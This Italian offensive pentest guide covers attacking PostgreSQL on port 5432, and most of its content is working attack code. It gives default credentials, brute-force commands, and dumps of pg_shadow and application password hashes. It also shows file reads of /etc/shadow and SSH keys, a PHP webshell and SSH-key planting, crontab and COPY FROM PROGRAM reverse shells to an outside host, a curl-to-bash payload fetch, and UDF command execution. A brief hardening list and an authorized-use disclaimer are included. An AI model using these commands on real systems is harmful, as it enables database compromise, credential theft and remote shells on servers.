---
title: 'Porta 5432 PostgreSQL: Payload, pg_shadow, COPY PROGRAM e RCE'
slug: porta-5432-postgresql
description: 'Pentest PostgreSQL sulla porta 5432: enumerazione, brute force, pg_shadow, file read/write, COPY PROGRAM, RCE e privilege escalation in lab.'
image: /porta-5432-postgresql.webp
draft: true
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - PostgreSQL
  - pg_shadow
  - COPY PROGRAM
---

PostgreSQL è il database relazionale open source più avanzato e uno dei più diffusi in ambienti enterprise, SaaS e infrastrutture cloud. Ascolta sulla porta 5432 TCP e alimenta applicazioni web (Django, Rails, Spring), piattaforme analytics, data warehouse e microservizi. Nel penetration testing, PostgreSQL ha una superficie di attacco più ampia di [MySQL](https://hackita.it/articoli/porta-3306-mysql) grazie a funzionalità native come `COPY TO/FROM PROGRAM` che permette di eseguire comandi di sistema direttamente da una query SQL — senza bisogno di UDF esterne o exploit. In pratica: se hai credenziali con il privilegio giusto, hai una shell.

PostgreSQL è spesso il database dietro applicazioni critiche — Django admin panel, GitLab, SonarQube, Grafana, Confluence, Keycloak. Compromettere il database significa compromettere l'applicazione e i dati di tutti i suoi utenti.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5432 10.10.10.40
```

```
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 15.4
```

### Script Nmap

```bash
nmap -p 5432 --script=pgsql-brute,pgsql-info 10.10.10.40
```

```
| pgsql-info:
|   Version: PostgreSQL 15.4 on x86_64-pc-linux-gnu
|_  compiled by gcc 12.2.0, 64-bit
```

La versione esatta → cerca CVE su [Exploit-DB](https://hackita.it/articoli/exploit-db).

### Banner grab manuale

```bash
# PostgreSQL risponde con un banner al protocollo startup
psql -h 10.10.10.40 -U test -d postgres
```

```
psql: error: connection to server at "10.10.10.40", port 5432 failed:
FATAL:  password authentication failed for user "test"
```

Il messaggio conferma: PostgreSQL è attivo, auth è richiesta. Se il messaggio fosse `no pg_hba.conf entry for host` → il tuo IP non è nella whitelist di connessione.

## 2. Credential Attack

### Default credentials

| Username     | Password     | Contesto                    |
| ------------ | ------------ | --------------------------- |
| `postgres`   | `postgres`   | Setup di default più comune |
| `postgres`   | *(vuota)*    | Installazioni trust-mode    |
| `postgres`   | `password`   | Setup di test               |
| `admin`      | `admin`      | Applicazioni custom         |
| `gitlab`     | `gitlab`     | GitLab default              |
| `sonarqube`  | `sonarqube`  | SonarQube default           |
| `grafana`    | `grafana`    | Grafana default             |
| `keycloak`   | `keycloak`   | Keycloak default            |
| `confluence` | `confluence` | Confluence default          |

```bash
psql -h 10.10.10.40 -U postgres -d postgres
# Password: postgres
```

```
postgres=# \conninfo
You are connected to database "postgres" as user "postgres" via TCP/IP at "10.10.10.40", port "5432".
```

### Brute force

```bash
# Hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt 10.10.10.40 postgres
```

```bash
# Metasploit
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.10.10.40
set USERNAME postgres
set PASS_FILE /usr/share/wordlists/common_passwords.txt
run
```

```bash
# Nmap
nmap -p 5432 --script=pgsql-brute --script-args="userdb=users.txt,passdb=passwords.txt" 10.10.10.40
```

### Credenziali da file di configurazione

```bash
# Django settings.py
grep -r "DATABASES" /var/www/ /opt/ 2>/dev/null

# Rails database.yml
find / -name "database.yml" 2>/dev/null -exec cat {} \;

# .pgpass file (password salvate per psql)
cat ~/.pgpass
# formato: hostname:port:database:username:password
```

```
db-prod.corp.internal:5432:webapp:app_user:AppDB_2025!
```

## 3. Post-Authentication — Enumerazione Database

### Informazioni di sistema

```sql
-- Versione
SELECT version();

-- Utente corrente
SELECT current_user;

-- Superuser?
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- Database correnti
SELECT datname FROM pg_database;

-- Tabelle nel database corrente
\dt
-- oppure
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```

### Dump credenziali dal database

```sql
-- Hash delle password degli utenti PostgreSQL
SELECT usename, passwd FROM pg_shadow;
```

```
 usename  |               passwd
----------+-------------------------------------
 postgres | md5abc123def456789...
 app_user | SCRAM-SHA-256$4096:salt...
```

**Formati hash PostgreSQL:**

* **md5** (legacy): `md5` + MD5(password + username) → [Hashcat](https://hackita.it/articoli/hashcat) mode 11
* **SCRAM-SHA-256** (PostgreSQL 10+): più robusto, hashcat mode 28600

```bash
# Crack MD5 PostgreSQL
hashcat -m 11 hash.txt /usr/share/wordlists/rockyou.txt

# Crack SCRAM-SHA-256
hashcat -m 28600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Dump dati dell'applicazione

```sql
-- Lista tabelle con dati interessanti
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'public'
ORDER BY table_name;
```

```sql
-- Cerca tabelle con nomi interessanti
SELECT table_name FROM information_schema.tables
WHERE table_name LIKE '%user%'
   OR table_name LIKE '%account%'
   OR table_name LIKE '%credential%'
   OR table_name LIKE '%session%'
   OR table_name LIKE '%token%';
```

```sql
-- Dump utenti applicazione (Django)
SELECT username, email, password FROM auth_user;
```

```
 username |        email         |                  password
----------+----------------------+-------------------------------------------
 admin    | admin@corp.com       | pbkdf2_sha256$260000$salt$hash...
 j.smith  | j.smith@corp.com     | pbkdf2_sha256$260000$salt$hash...
```

Hash Django (PBKDF2-SHA256) → hashcat mode 10000.

```sql
-- Dump sessioni attive (session hijacking)
SELECT session_key, session_data, expire_date FROM django_session
WHERE expire_date > NOW();
```

## 4. File Read — Leggere File dal Server

### COPY FROM (superuser)

```sql
-- Leggi /etc/passwd
CREATE TABLE tmp_file(content TEXT);
COPY tmp_file FROM '/etc/passwd';
SELECT * FROM tmp_file;
DROP TABLE tmp_file;
```

```
root:x:0:0:root:/root:/bin/bash
postgres:x:126:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

```sql
-- Leggi pg_hba.conf (regole di accesso)
COPY tmp_file FROM '/etc/postgresql/15/main/pg_hba.conf';

-- Leggi chiave SSH
COPY tmp_file FROM '/var/lib/postgresql/.ssh/id_rsa';

-- Leggi configurazione applicazione
COPY tmp_file FROM '/var/www/html/config/database.yml';
COPY tmp_file FROM '/opt/app/.env';
```

### pg\_read\_file (PostgreSQL 10+, superuser)

```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/shadow');  -- se PostgreSQL gira come root (raro)
SELECT pg_read_file('/var/lib/postgresql/.pgpass');
```

### lo\_import (Large Object)

```sql
-- Importa un file come Large Object
SELECT lo_import('/etc/passwd');
-- Restituisce un OID, ad esempio 16789

-- Leggi il contenuto
SELECT lo_get(16789);

-- Pulisci
SELECT lo_unlink(16789);
```

## 5. File Write — Scrivere File sul Server

### COPY TO

```sql
-- Scrivi una webshell (se conosci il web root)
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';
```

```bash
# Testa la webshell
curl "http://10.10.10.40/cmd.php?c=id"
```

```sql
-- Scrivi una chiave SSH
COPY (SELECT 'ssh-rsa AAAA...attacker_key') TO '/var/lib/postgresql/.ssh/authorized_keys';
```

```bash
# Connettiti via SSH come utente postgres
ssh postgres@10.10.10.40
```

```sql
-- Scrivi crontab per reverse shell
COPY (SELECT '* * * * * bash -c "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"') TO '/var/spool/cron/crontabs/postgres';
```

### lo\_export (Large Object)

```sql
-- Crea un Large Object con contenuto custom
SELECT lo_from_bytea(0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64'));
-- OID restituito: 16790

-- Esporta come file
SELECT lo_export(16790, '/var/www/html/cmd.php');
SELECT lo_unlink(16790);
```

## 6. RCE — Remote Code Execution

### COPY TO/FROM PROGRAM (il modo più diretto)

Disponibile da PostgreSQL 9.3+, richiede superuser:

```sql
-- Esegui un comando e leggi l'output
COPY tmp_cmd FROM PROGRAM 'id';
SELECT * FROM tmp_cmd;
```

```
uid=126(postgres) gid=134(postgres) groups=134(postgres)
```

```sql
-- Reverse shell diretta
COPY tmp_cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"';
```

```sql
-- Enumerazione dal database
COPY tmp_cmd FROM PROGRAM 'cat /etc/shadow';
COPY tmp_cmd FROM PROGRAM 'ls -la /root/';
COPY tmp_cmd FROM PROGRAM 'ss -tlnp';
COPY tmp_cmd FROM PROGRAM 'cat /root/.ssh/id_rsa';
```

Questa è la feature più potente di PostgreSQL per un pentester: **RCE nativa, senza exploit, senza UDF, senza compilazione**. Basta essere superuser.

### UDF — User Defined Functions (C library)

Se `COPY PROGRAM` è bloccato o non sei superuser:

```sql
-- Crea una funzione che esegue comandi OS
CREATE OR REPLACE FUNCTION cmd_exec(text) RETURNS text AS $$
  import os
  return os.popen(args[0]).read()
$$ LANGUAGE plpython3u;

SELECT cmd_exec('id');
```

Richiede che `plpython3u` (PL/Python untrusted) sia installato:

```sql
-- Verifica linguaggi disponibili
SELECT * FROM pg_language;

-- Installa plpython3u (richiede superuser)
CREATE EXTENSION plpython3u;
```

### UDF con libreria C

```sql
-- Carica una shared library custom
CREATE OR REPLACE FUNCTION sys(text) RETURNS text
AS '/tmp/pg_exec.so', 'pg_exec'
LANGUAGE C STRICT;

SELECT sys('id');
```

Il file `pg_exec.so` va compilato e caricato sul server (via lo\_export o COPY TO).

### sqlmap (da SQL injection web)

```bash
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql --os-shell
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

## 7. Privilege Escalation

### Da utente normale a superuser PostgreSQL

```sql
-- Verifica ruoli
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles;
```

```sql
-- Se hai CREATEROLE
ALTER ROLE current_user SUPERUSER;
```

```sql
-- Cerca password in chiaro nelle tabelle
SELECT * FROM pg_settings WHERE name LIKE '%password%';
```

### Da PostgreSQL a root Linux

```bash
# La shell da COPY PROGRAM gira come utente "postgres"
# Enumera per privilege escalation Linux
```

```sql
-- Da PostgreSQL, lancia linpeas
COPY tmp FROM PROGRAM 'curl http://10.10.10.200/linpeas.sh | bash';
```

Path comuni di escalation:

* **sudo -l** → l'utente postgres ha sudo su qualcosa?
* **SUID binaries** → find / -perm -4000
* **Kernel exploit** se il sistema è vecchio
* **Credenziali in .pgpass** di altri utenti → test su [SSH](https://hackita.it/articoli/ssh)
* **pg\_hba.conf con trust** per connessioni locali → qualsiasi utente si connette senza password

Per la guida completa: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc) e [Linux Enumeration](https://hackita.it/articoli/linux-enumeration).

## 8. Lateral Movement

```sql
-- Credenziali nelle tabelle → test su altri servizi
-- Email + password hash → crack + spray su SSH/RDP/SMB

-- Cerca connessioni ad altri database nel codice
COPY tmp FROM PROGRAM 'grep -riE "jdbc|mysql|mongodb|redis" /opt/ /var/www/ /home/ 2>/dev/null';

-- Network scan dalla macchina PostgreSQL
COPY tmp FROM PROGRAM 'for h in $(seq 1 254); do timeout 0.5 bash -c "echo >/dev/tcp/10.10.10.$h/22" 2>/dev/null && echo "10.10.10.$h:22 open"; done';
```

Credenziali trovate → testa su [SSH](https://hackita.it/articoli/ssh), [RDP](https://hackita.it/articoli/porta-3389-rdp), [SMB](https://hackita.it/articoli/smb), [Redis](https://hackita.it/articoli/porta-6379-redis).

## 9. Detection & Hardening

* **`listen_addresses = 'localhost'`** — non esporre sulla rete se non necessario
* **pg\_hba.conf restrittivo** — `md5` o `scram-sha-256`, mai `trust` per connessioni remote
* **Password forte per postgres** — non lasciare il default
* **Utente applicativo con privilegi minimi** — non superuser, solo SELECT/INSERT sulle tabelle necessarie
* **Disabilita `COPY PROGRAM`** per utenti non-admin (revoca superuser)
* **Non installare plpython3u** se non necessario
* **Firewall** — porta 5432 solo dalla rete applicativa
* **Audit con pgAudit** — logga tutte le query DDL e DML privilegiate
* **SCRAM-SHA-256** come metodo di auth (non md5)
* **Patch regolari** — CVE PostgreSQL sono frequenti

## 10. Cheat Sheet Finale

| Azione        | Comando                                                                             |
| ------------- | ----------------------------------------------------------------------------------- |
| Nmap          | `nmap -sV -p 5432 --script=pgsql-brute target`                                      |
| Connessione   | `psql -h target -U postgres -d postgres`                                            |
| Hydra         | `hydra -l postgres -P wordlist target postgres`                                     |
| Versione      | `SELECT version();`                                                                 |
| Superuser?    | `SELECT usesuper FROM pg_user WHERE usename=current_user;`                          |
| Dump hash     | `SELECT usename, passwd FROM pg_shadow;`                                            |
| File read     | `COPY tmp FROM '/etc/passwd';` o `pg_read_file()`                                   |
| File write    | `COPY (SELECT 'data') TO '/path/file';`                                             |
| **RCE**       | `COPY tmp FROM PROGRAM 'id';`                                                       |
| Reverse shell | `COPY tmp FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"';`               |
| UDF Python    | `CREATE FUNCTION cmd(text) RETURNS text AS $$ import os... $$ LANGUAGE plpython3u;` |
| Hashcat md5   | `hashcat -m 11 hash wordlist`                                                       |
| Hashcat SCRAM | `hashcat -m 28600 hash wordlist`                                                    |
| sqlmap        | `sqlmap -u URL --dbms=postgresql --os-shell`                                        |

***

Riferimento: PostgreSQL documentation, HackTricks PostgreSQL, OSCP methodology. Uso esclusivo in ambienti autorizzati. [https://x3m1sec.gitbook.io/notes/pentest-notes/protocols-and-services/ports-5432-postgres](https://x3m1sec.gitbook.io/notes/pentest-notes/protocols-and-services/ports-5432-postgres)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
